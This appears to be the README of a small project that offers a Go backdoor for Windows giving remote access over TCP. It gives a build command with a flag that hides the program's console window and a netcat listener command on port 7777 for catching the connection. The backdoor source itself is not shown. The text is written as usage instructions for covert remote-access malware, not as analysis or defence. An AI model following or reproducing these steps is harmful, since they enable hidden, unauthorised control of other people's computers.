# go-basic-backdoor

This is a basic golang backdoor for windows over tcp in 24 line 

# Compilation

go build -ldflags -H=windowsgui backdoor.go__

# Start netcat listener and execute it

nc -L 0.0.0.0 -p 7777__
